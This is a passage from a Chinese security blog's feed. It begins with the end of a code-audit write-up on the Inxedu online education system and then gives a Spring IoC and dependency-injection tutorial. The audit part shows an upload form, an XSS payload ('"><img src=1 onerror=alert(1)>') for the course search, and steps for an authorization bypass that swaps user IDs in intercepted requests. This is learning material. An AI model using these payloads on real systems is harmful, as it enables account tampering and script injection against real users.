class="type">name</span> = "fileType" <span class="keyword">value</span>=""&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> id="btnUpload" <span class="keyword">type</span>="submit" <span class="keyword">value</span>="上传"&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>构造上传表单</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213121211.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213121225.png" alt=""></p><h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><h5 id="源码审计-1"><a href="#源码审计-1" class="headerlink" title="源码审计"></a>源码审计</h5><p>漏洞位置:CourseController.java,功能点为前台查询课程处。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210212122514.png" alt=""></p><p>我们知道${queryCourse.courseName}是spring的EL表达式。代表queryCourse这个实体类下面courseName的值，我们geng</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213182040.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213182147.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213182225.png" alt=""></p><h5 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>找到搜索课程处，插入漏洞payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20210213115840.png" alt=""></p><h4 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h4><h5 id="源码审计-2"><a href="#源码审计-2" class="headerlink" title="源码审计"></a>源码审计</h5><p>漏洞位置:UserController.java，功能为修改用户信息。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213185228.png" alt=""></p><p>跟进对应的接口的实现类。发现并没有判断用户的权限。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213185425.png" alt=""></p><p>继续跟进对应接口的实现类，直接引用mapper文件更新信息  。     </p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213185436.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20210212133339.png" alt=""></p><h5 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>首先注册两个账户，记下user.userId。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213183058.png" alt=""></p><p>登录另一个账户，抓包，替换user.userId，即可越权修改对应id的用户信息。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213183308.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213183430.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SSM框架审计学习–-因酷网校在线教育系统审计学习&quot;&gt;&lt;a href=&quot;#SSM框架审计学习–-因酷网校在线教育系统审计学习&quot; class=&quot;headerlink&quot; title=&quot;SSM框架审计学习– 因酷网校在线教育系统审计学习&quot;&gt;&lt;/a&gt;SSM框架审计学习– 
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Java安全--Spring框架基础学习</title>
    <link href="https://shu1l.github.io/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/"/>
    <id>https://shu1l.github.io/2021/02/12/java-an-quan-spring-ji-chu-xue-xi/</id>
    <published>2021-02-12T12:00:33.000Z</published>
    <updated>2021-02-12T12:19:25.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Spring框架基础学习"><a href="#Spring框架基础学习" class="headerlink" title="Spring框架基础学习"></a>Spring框架基础学习</h2><h3 id="Spring–IOC"><a href="#Spring–IOC" class="headerlink" title="Spring–IOC"></a>Spring–IOC</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>spring的核心思想是IOC和AOP，IoC - Inversion of Control, 控制反转，通俗点说就是把创建和管理bean的过程转移给了第三方。而这个第三方就是我们说的IOC容器。</p><p>Spring容器将创建对象,把它们连接在一起,配置它们,并管理他们的整个生命周期从创建到销毁。控制着bean的依赖注入。</p><p><strong>那么这里为什么要叫做控制反转呢?</strong></p><p>我们先来对比下两种不同的获取外部对象的资源的方法。</p><ul><li>主动去创建相关对象然后再组合。</li></ul><p><img src="261421378318292.jpg" alt="img"></p><ul><li>IOC/DI容器中</li></ul><p><img src="img.png" alt="img"></p><p>在 Spring 中，类的实例化、依赖的实例化、依赖的传入都交由 Spring Bean 容器控制，而不是用<code>new</code>方式实例化对象、通过非构造函数方法传入依赖等常规方式。<strong>实质的控制权已经交由程序管理，而不是程序员管理，所以叫做控制反转。</strong></p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>有一个<code>Book</code>类：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name ;     <span class="comment">//书名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> money;        /价格  </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Book</span><span class="params">(<span class="keyword">String</span> name, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Person</code>类依赖于<code>Book</code>类，</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Book book;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Person(Book book) &#123;</span><br><span class="line">        <span class="keyword">this</span>.book = book;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    因为IoC容器要负责实例化所有的组件，因此，有必要告诉容器如何创建组件，以及各组件的依赖关系。一种最简单的配置是通过XML文件来实现，例如：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans&gt;</span><br><span class="line">    &lt;bean id=<span class="string">"dataSource"</span> <span class="keyword">class</span>="<span class="symbol">HikariDataSource</span>" /&gt;</span><br><span class="line">    &lt;<span class="symbol">bean</span> <span class="symbol">id</span>="<span class="symbol">bookService</span>" <span class="symbol">class</span>="<span class="symbol">BookService</span>"&gt;</span><br><span class="line">        &lt;<span class="symbol">property</span> <span class="symbol">name</span>="<span class="symbol">dataSource</span>" <span class="symbol">ref</span>="<span class="symbol">dataSource</span>" /&gt;</span><br><span class="line">    &lt;/<span class="symbol">bean</span>&gt;</span><br><span class="line">    &lt;<span class="symbol">bean</span> <span class="symbol">id</span>="<span class="symbol">userService</span>" <span class="symbol">class</span>="<span class="symbol">UserService</span>"&gt;</span><br><span class="line">        &lt;<span class="symbol">property</span> <span class="symbol">name</span>="<span class="symbol">dataSource</span>" <span class="symbol">ref</span>="<span class="symbol">dataSource</span>" /&gt;</span><br><span class="line">    &lt;/<span class="symbol">bean</span>&gt;</span><br><span class="line">&lt;/<span class="symbol">beans</span>&gt;</span><br></pre></td></tr></table></figure><p>​    上述XML配置文件指示IoC容器创建3个JavaBean组件，并把id为<code>dataSource</code>的组件通过属性<code>dataSource</code>（即调用<code>setDataSource()</code>方法）注入到另外两个组件中。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在Spring的IoC容器中，我们把所有组件统称为JavaBean，即配置一个组件就是配置一个Bean,控制反转通过依赖注入(DI)方式实现对象之间的松耦合关系。</p><h3 id="Spring–Bean"><a href="#Spring–Bean" class="headerlink" title="Spring–Bean"></a>Spring–Bean</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​    spring官方文档对bean的解释是:在spring中,构成应用程序主干并由Spring IoC容器管理的对象称为bean。bea是一个由Spring IoC容器实例化、组装和管理的对象。</p><p>bean主要包含以下几个概念:</p><ul><li>Bean容器，或称spring ioc容器，主要用来管理对象和依赖，以及依赖的注入。</li><li>bean是一个java对象,根据bean规范编写出来的类,并由bean容器生成的对象就是一个bean。</li><li>bean规范</li></ul><p><img src="ioc-bean.png" alt="img"></p><h4 id="Bean实例化"><a href="#Bean实例化" class="headerlink" title="Bean实例化"></a>Bean实例化</h4><h5 id="1-普通构造方法创建"><a href="#1-普通构造方法创建" class="headerlink" title="1.普通构造方法创建"></a>1.普通构造方法创建</h5><p>使用比较多的一种创建方式，可以直接配置bean节点,例如:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"add()---------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在xml中简单配置一个bean节点，如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="attribute">class</span>=<span class="string">"org.test.Demo"</span> <span class="attribute">id</span>=<span class="string">"test"</span>/&gt;</span><br></pre></td></tr></table></figure><p>通过以下代码进行简单的测试：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ApplicationContext context = <span class="keyword">new</span> <span class="constructor">ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>)</span>;</span><br><span class="line">        Demo test = (Demo) context.get<span class="constructor">Bean(<span class="string">"test"</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(test);</span><br></pre></td></tr></table></figure><h5 id="2-静态工厂创建"><a href="#2-静态工厂创建" class="headerlink" title="2.静态工厂创建"></a>2.静态工厂创建</h5><p>通过静态构造方法来创建一个bean的实例，如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"add2()---------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个静态工厂，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo2Factory</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Demo2 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Demo2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该工厂中有一个静态方法，该静态方法返回一个的实例，通过Spring的配置文件生成Demo2的实例：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="attribute">id</span>=<span class="string">"demo2"</span> <span class="attribute">class</span>=<span class="string">"org.test.demo2Factory"</span> <span class="attribute">factory-method</span>=<span class="string">"getInstance"</span>/&gt;</span><br></pre></td></tr></table></figure><p>factory-method属性，该属性指明该类中的静态工厂方法名为getInstance，spring框架根据属性来调用方法来获取Demo2的实例了，测试代码如下：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">        Demo2 demo = (Demo2) context.getBean(<span class="string">"demo2"</span>);</span><br><span class="line">        demo.add();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="实例工厂创建"><a href="#实例工厂创建" class="headerlink" title="实例工厂创建"></a>实例工厂创建</h5><p>通过实例工厂来创建bean实例，例如:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo3</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"add3()---------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时有一个工厂方法，如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo3Factory</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Demo3 <span class="title">getDemo3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Demo3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Demo3Factory类中有一个getDemo3的方法，该方法返回一个Demo3类的实例,Spring的配置文件如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="attribute">class</span>=<span class="string">"org.test.Demo3Factory"</span> <span class="attribute">id</span>=<span class="string">"demo3Factory"</span>/&gt;</span><br><span class="line">    &lt;bean <span class="attribute">id</span>=<span class="string">"demo3"</span> <span class="attribute">factory-bean</span>=<span class="string">"demo3Factory"</span> <span class="attribute">factory-method</span>=<span class="string">"getDemo3"</span>/&gt;</span><br></pre></td></tr></table></figure><p>第一个bean用来获取demo3Factory的实例，第二个bean则根据demo3Factory的实例，然后指定factory-method，通过getDemo3方法来获取Demo3的实例。<br>测试代码如下：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">    Demo3 demo = (Demo3) context.getBean(<span class="string">"demo3"</span>);</span><br><span class="line">    demo.add();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Bean作用域"><a href="#Bean作用域" class="headerlink" title="Bean作用域"></a>Bean作用域</h4><p>spring bean 一共有五种作用域。</p><h5 id="1-Singleton-（缺省作用域、单例类型）"><a href="#1-Singleton-（缺省作用域、单例类型）" class="headerlink" title="1.Singleton （缺省作用域、单例类型）"></a>1.Singleton （缺省作用域、单例类型）</h5><p>​    容器中只存在一个共享的Bean，只要id与Bean定义相匹配，那就会是同一个Bean。在容器启动（实例化）时Bean就实例化和初始化（可以通过lazy-init=”true”来设置使得Bean被调用时才初始化）。</p><h5 id="2-Prototype-（原型类型）"><a href="#2-Prototype-（原型类型）" class="headerlink" title="2.Prototype （原型类型）"></a>2.Prototype （原型类型）</h5><p>​    对有状态的Bean建议使用Prototype，对无状态建议使用Singleton。<br>容器启动时并没有实例化Bean，只有获取Bean时才会被创建，并且每一次都是新建一个对象。</p><h5 id="3-request（web的Spring-ApplicationContext）"><a href="#3-request（web的Spring-ApplicationContext）" class="headerlink" title="3.request（web的Spring ApplicationContext）"></a>3.request（web的Spring ApplicationContext）</h5><p>​    每个HTTP 都会有自己的Bean，当处理结束时，Bean销毁。</p><h5 id="4-session（web的Spring-ApplicationContext）"><a href="#4-session（web的Spring-ApplicationContext）" class="headerlink" title="4.session（web的Spring ApplicationContext）"></a>4.session（web的Spring ApplicationContext）</h5><p>​    每一个Http session有自己的Bean</p><h5 id="5-global-session（web的Spring-ApplicationContext）"><a href="#5-global-session（web的Spring-ApplicationContext）" class="headerlink" title="5.global session（web的Spring ApplicationContext）"></a>5.global session（web的Spring ApplicationContext）</h5><p>​        global session作用域类似于标准的HTTP Session作用域，不过仅仅在基于portlet的web应用中才有意义。Portlet规范定义了全局Session的概念，它被所有构成某个portlet web应用的各种不同的portlet所共享。在global session作用域中定义的bean被限定于全局portlet Session的生命周期范围内。</p><h4 id="Bean生命周期"><a href="#Bean生命周期" class="headerlink" title="Bean生命周期"></a>Bean生命周期</h4><p>　　Spring Bean的完整生命周期从创建Spring容器开始，直到最终Spring容器销毁Bean，这其中包含了一系列关键点。</p><p><img src="181453414212067.png" alt="img"></p><p><img src="181454040628981.png" alt="img"></p><h5 id="单例管理的对象"><a href="#单例管理的对象" class="headerlink" title="单例管理的对象"></a>单例管理的对象</h5><p>Bean在容器启动时就会实例化和初始化，但是可以通过Bean的设置来设置对象的初始化时机<br>第一种：通过设置<bean></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="attribute">id</span>=<span class="string">"ServiceImpl"</span> <span class="attribute">class</span>=<span class="string">"cn.csdn.service.ServiceImpl"</span> <span class="attribute">lazy-init</span>=<span class="string">"true"</span>/&gt;</span><br></pre></td></tr></table></figure><p>第二种：通过设置<Beans>来修改所有bean默认方式的初始化时机</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans <span class="keyword">default</span>-<span class="built_in">lazy</span>-<span class="keyword">init</span>=<span class="string">"true"</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="非单例管理的对象"><a href="#非单例管理的对象" class="headerlink" title="非单例管理的对象"></a>非单例管理的对象</h5><p>Spring读取xml文件的时候，并不会立刻创建对象，而是在第一次请求该bean时才初始化（如调用getBean方法时）。<strong>容器只会实例化和初始化Bean，不会销毁Bean。清除prototype作用域的对象并释放任何prototype bean所持有的昂贵资源，都是客户端代码的职责。</strong>在初始化后交由调用者管理</p><h3 id="Spring–依赖注入-DI"><a href="#Spring–依赖注入-DI" class="headerlink" title="Spring–依赖注入(DI)"></a>Spring–依赖注入(DI)</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>依赖注入(Dependency Injection，DI)，和控制反转含义相同，<strong>它们是从两个角度描述的同一个概念。</strong></p><p>​    当某个java实例(调用者)需要另一个java实例(被调用者)，我们通常采用的方法是由调用者来创建被调用者的实例。（使用new关键字获得被调用者的实例)。</p><p>​    在spring中，spring在创建被调用者的实例时，会自动将调用者需要的对象实例注入给调用者，调用者通过spring容器获得被调用者实例，被称为依赖注入。</p><h4 id="注入方式-bean装配"><a href="#注入方式-bean装配" class="headerlink" title="注入方式(bean装配)"></a>注入方式(bean装配)</h4><p>​    依赖注入的本质就是装配，装配是依赖注入的具体行为。在Spring中，注入依赖对象可以采用手工装配或自动装配。</p><p><strong>手工装配一般分为两种方式</strong>：</p><ul><li><p>一种是在XML文件中，通过在bean节点下配置；比如使用属性的setter方法注入依赖对象或者使用构造方法注入。</p></li><li><p>一种就是在java代码中使用注解的方式进行装配，在代码中加入@Resource或者@Autowired。</p></li></ul><h5 id="setter方法注入"><a href="#setter方法注入" class="headerlink" title="setter方法注入"></a>setter方法注入</h5><p>​    由于setter注入方式具有可选择性和灵活性高的特点，因此它也是实际开发中最常用的注入方式。setter方法更加直观，我们来看一下spring的配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用spring管理对象的创建，还有对象的依赖关系 --&gt;</span>    </span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Mysql"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4MysqlImpl"</span>/&gt;</span>     </span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Oracle"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4OracleImpl"</span>/&gt;</span>          </span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userManager"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.manager.UserManagerImpl"</span>&gt;</span>    </span><br><span class="line">       <span class="comment">&lt;!-- (1)userManager使用了userDao，Ioc是自动创建相应的UserDao实现，都是由容器管理--&gt;</span>    </span><br><span class="line">       <span class="comment">&lt;!-- (2)在UserManager中提供构造函数，让spring将UserDao实现注入（DI）过来 --&gt;</span>    </span><br><span class="line">       <span class="comment">&lt;!-- (3)让spring管理我们对象的创建和依赖关系，必须将依赖关系配置到spring的核心配置文件中 --&gt;</span>    </span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"userDao"</span> <span class="attr">ref</span>=<span class="string">"userDao4Oracle"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span>    </span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着我们来看一下，setter表示依赖关系的写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tgb.spring.dao.UserDao;    </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserManagerImpl</span> <span class="keyword">implements</span> <span class="title">UserManager</span></span>&#123;     </span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;    </span><br><span class="line">    <span class="comment">//使用设值方式赋值    </span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;    </span><br><span class="line">    &#125;          </span><br><span class="line">    <span class="meta">@Override</span>    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(String userName, String password)</span> </span>&#123;      </span><br><span class="line">        userDao.addUser(userName, password);    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="构造函数注入"><a href="#构造函数注入" class="headerlink" title="构造函数注入"></a>构造函数注入</h5><p>​    构造函数注入是除setter注入之外的另一种常用的注入方式，它可以保证一些必要的属性在bean实例化时就得到了设置，并在实例化后就可以使用。</p><p>使用构造函数注入的前提是： bean必须提供带参的构造函数。</p><p>对于构造函数的注入，配置文件可以有以下几种方式：</p><ul><li>按类型匹配入参</li><li>按索引匹配入参</li><li>联合使用类型和索引匹配入参</li><li>通过自身类型反射匹配入参</li></ul><p>我们看一下spring的配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用spring管理对象的创建，还有对象的依赖关系 --&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Mysql"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4MysqlImpl"</span>/&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao4Oracle"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.dao.UserDao4OracleImpl"</span>/&gt;</span>         </span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userManager"</span> <span class="attr">class</span>=<span class="string">"com.tgb.spring.manager.UserManagerImpl"</span>&gt;</span>    </span><br><span class="line">        <span class="comment">&lt;!-- (1)userManager使用了userDao，Ioc是自动创建相应的UserDao实现，都是由容器管理--&gt;</span>   </span><br><span class="line">        <span class="comment">&lt;!-- (2)在UserManager中提供构造函数，让spring将UserDao实现注入（DI）过来 --&gt;</span>    </span><br><span class="line">        <span class="comment">&lt;!-- (3)让spring管理我们对象的创建和依赖关系，必须将依赖关系配置到spring的核心配置文件中 --&gt;</span>    </span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"userDao4Oracle"</span>/&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们再来看一下，构造器表示依赖关系的写法，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tgb.spring.dao.UserDao;    </span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserManagerImpl</span> <span class="keyword">implements</span> <span class="title">UserManager</span></span>&#123;   </span><br><span class="line">        <span class="keyword">private</span> UserDao userDao;    </span><br><span class="line">        <span class="comment">//使用构造方式赋值    </span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">UserManagerImpl</span><span class="params">(UserDao userDao)</span> </span>&#123;    </span><br><span class="line">            <span class="keyword">this</span>.userDao = userDao;    </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="meta">@Override</span>    </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">(String userName, String password)</span> </span>&#123;         </span><br><span class="line">            userDao.addUser(userName, password);    </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>基于注解</strong></p><p>​    使用注解注入依赖对象不用再在代码中写依赖对象的setter方法或者该类的构造方法，并且不用再配置文件中配置大量的依赖对象，使代码更加简洁，清晰，易于维护。</p><p>在Spring IOC编程的实际开发中推荐使用注解的方式进行依赖注入。</p><ul><li>Autowired是自动注入，自动从spring的上下文找到合适的bean来注入</li><li>Resource用来指定名称注入</li><li>Qualifier和Autowired配合使用，指定bean的名称，如</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@Autowired  </span><br><span class="line">@Qualifier(&quot;userDAO&quot;)  </span><br><span class="line">private UserDAO userDAO;</span><br></pre></td></tr></table></figure><p>Spring容器的配置文件applicationContext.Xml文件中配置以下信息,是一个Spring配置文件的模板：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 